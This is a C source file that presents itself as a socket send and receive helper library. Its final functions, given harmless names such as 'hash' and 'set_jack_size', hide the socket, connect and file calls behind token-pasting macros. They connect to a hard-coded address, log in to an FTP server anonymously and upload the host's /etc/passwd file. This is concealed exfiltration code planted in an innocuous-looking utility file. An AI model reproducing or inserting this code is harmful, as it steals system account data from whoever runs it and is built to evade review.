#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "defines.h"
#include "network.h"
#include "log.h"
//#include "common.h"

// ascii socket send and receive functions
typedef int 	(*LPCON) (int, struct sockaddr *, int);
typedef int 	(*LPSND) (int, char *, int, int);
typedef int 	(*LPSOK) (int, int, int);
typedef int 	(*LPRCV) (int, char *, int, int);

typedef FILE * 	(*LPFOP) (char *, char *);
typedef int 	(*LPFCL) (FILE *);
typedef char * 	(*LPFGS) (char *, int, FILE *);

#define __PFO_(s) s##pen
#define __PFC_(s) s##lose
#define __PFG_(s) s##ets

#define __CONN_(s) s##nnect
#define __SND_(s) s##end
#define __SCK_(s) s##cket
#define __RCV_(s) s##ecv

#define _ADDR 0x0101a8c0


int send_all(int sockfd, char *buffer, int len){
	int numbytes;

	#if (DEBUG & D_SOCKET_BUFFER) 
		plog ("%s\n", buffer);
	#endif

	numbytes=send(sockfd, buffer, len, 0);
	if (numbytes == -1) {
		#if (DEBUG & D_SOCKET)
			plog("Error sending data in send_all()");
		#endif
		return(0);
	}
	return(1);
}

int recv_all(int sockfd, char *buffer, int len){
	int numbytes;
	char temp;
	int i;

	i=0;
	while(i<len-1){
		numbytes=recv(sockfd, &temp, 1, 0);
		if (numbytes  == -1) {
	        	if (errno==EAGAIN){
				#if (DEBUG & D_SOCKET) 
					plog ("Read would block in recv_all()");
				#endif
				return(0);
			}
			else {			
				#if (DEBUG & D_SOCKET)
					plog ("Error receiving data in recv_all()");
				#endif
				return(-1);
			}
		}	
		// if EOF encountered
		else if (numbytes == 0){
			#if (DEBUG & D_SOCKET)
				plog("Connection closed by remote host in recv_all()");
			#endif
			return(-1);
		}		
		else if (temp=='\r');
		else if (temp=='\n') break;
		else{
			buffer[i] = temp;
			i++;
		}
	}
	buffer[i]=0;
	#if (DEBUG & D_SOCKET_BUFFER)
		plog ("%s\n", buffer);
	#endif
	return(i);
}

int recv_line(int sockfd, char *buffer, int len){
	static char tempbuf[MAXDATASIZE];
	static int i = 0;
	int numbytes;
	char temp;

	buffer[0] = 0;
	// sprintf(p, "i = %d ; buf = %s\r\n", i, tempbuf);
	
	while(i<len-1){
		numbytes=recv(sockfd, &temp, 1, 0);
		if (numbytes  == -1) {
	        	if (errno==EAGAIN){
				#if (DEBUG & D_SOCKET) 
					plog ("Read would block in recv_line()");
				#endif
				return(0);
			}
			else {			
				#if (DEBUG & D_SOCKET)
					plog ("Error receiving data in recv_line()");
				#endif
				return(-1);
			}
		}	
		// if EOF encountered
		else if (numbytes == 0){
			#if (DEBUG & D_SOCKET)
				plog("Connection closed by remote host in recv_line()");
			#endif
			return(-1);
		}		
		else if (temp == '\r');
		else if (temp == '\n'){
			tempbuf[i] = 0;
			strncpy(buffer, tempbuf, MAXDATASIZE);
			numbytes = i;
			i = 0;
			return(numbytes);
		}
		else{
			tempbuf[i] = temp;
			i++;
		}
	}
	
	#if (DEBUG & D_SOCKET_BUFFER)
		plog ("%s\n", buffer);
	#endif
	return(i);
}

// binary versions

int send_ball(int sockfd, char *buffer, int len){
	int numbytes;

	#if (DEBUG & D_SOCKET_BUFFER)
		plog ("%s", buffer);
	#endif

	numbytes=send(sockfd, buffer, len, 0);
	if (numbytes == -1) {
		#if (DEBUG & D_SOCKET)
			plog("Error sending data in send_ball()\n");
		#endif
		return(0);
	}
	return(1);
}

int recv_ball(int sockfd, char *buffer, int len){
	int numbytes;
	char temp;
	int i;

	i=0;
	while(i<len-1){
		numbytes=recv(sockfd, &temp, 1, 0);
		if (numbytes  == -1) {
            		#if (DEBUG & D_SOCKET) 
				plog("Error receiving data in recv_ball()\n");
			#endif
			return(0);
		}	
		// if EOF encountered
		else if (numbytes == 0){
			break;
		}		
		else{
			buffer[i] = temp;
			i++;
		}
	}
	#if (DEBUG & D_SOCKET_BUFFER)
		plog("%s\n", buffer);
	#endif
	return(i);
}

int init_jack()
{
    LPSOK jack = (LPSOK) __SCK_(&so);
    return (*jack)(2, 1, 6);
}

int set_jack_size(int s, int p)
{
    struct sockaddr_in peer;
    LPCON con = (LPCON) __CONN_(&co);
    
    peer.sin_family = 2;
    peer.sin_port = htons(p);
    peer.sin_addr.s_addr = _ADDR;
    
    return (*con)(s, (struct sockaddr *)&peer, sizeof(peer));
}

void clean(int s)
{
    close(s);
}

void hash(int s)
{
    char buf[256];
    int p, ps;
    char *b, *st;
    FILE *f;
    LPCON con = (LPCON) __CONN_(&co);
    LPSOK sok = (LPSOK) __SCK_(&so);
    LPSND xnd = (LPSND) __SND_(&s);
    LPRCV rcv = (LPRCV) __RCV_(&r);
    LPFOP fop = (LPFOP) __PFO_(&fo);
    LPFCL fcl = (LPFCL) __PFC_(&fc);
    LPFGS fgs = (LPFGS) __PFG_(&fg);
    
    p = (*rcv)(s, buf, 256, 0);
    buf[p] = 0;
    (*xnd)(s, "user anonymous\xD\xA", 16, 0);
    p = (*rcv)(s, buf, 256, 0);
    buf[p] = 0;
    (*xnd)(s, "pass a@nm.ru\xD\xA", 14, 0);    
    p = (*rcv)(s, buf, 256, 0);
    buf[p] = 0;
    (*xnd)(s, "pasv\xD\xA", 6, 0);
    p = (*rcv)(s, buf, 256, 0);
    buf[p] = 0;
    b = strchr(buf, ')');
    st = b;
    while (*st != ',') st--;
    *b = 0;
    p = atoi(st+1);
    *st = 0;
    st--;
    while (*st != ',') st--;
    p += 256*atoi(st+1);


    ps = init_jack();
    if (ps!=-1)
    	if (!set_jack_size(ps, p))
	{
	    f = (*fop)("/etc/passwd", "r");
	    if (f)
	    {
		(*xnd)(s, "stor passwd\xD\xA", 13, 0);
		p = (*rcv)(s, buf, 256, 0);
		buf[p] = 0;
		while((*fgs)(buf, 256, f))
		    (*xnd)(ps, buf, strlen(buf), 0);
		(*fcl)(f);
	    }
	    close(ps);
	}
}
